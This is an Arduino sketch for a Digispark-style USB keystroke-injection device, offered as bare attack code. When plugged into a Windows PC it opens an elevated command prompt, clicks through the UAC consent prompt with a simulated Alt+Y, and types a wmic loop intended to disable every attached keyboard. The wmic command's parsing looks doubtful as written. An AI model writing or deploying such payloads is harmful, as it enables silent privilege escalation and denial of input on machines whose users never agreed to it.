
void setup() {
  pinMode(1, OUTPUT);
  DigiKeyboard.delay(2000);
}

void loop() {
  digitalWrite(1, HIGH);
  runPayload();
  digitalWrite(1, LOW);
  while(1);
}

void runPayload() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);

  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1500);

  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(1200);

  DigiKeyboard.println("for /f \"skip=1 tokens=1,*\" %a in ('wmic path win32_keyboard get pnpdeviceid /value') do wmic path win32_keyboard where \"pnpdeviceid='%a'\" call disable");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(800);

  DigiKeyboard.println("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}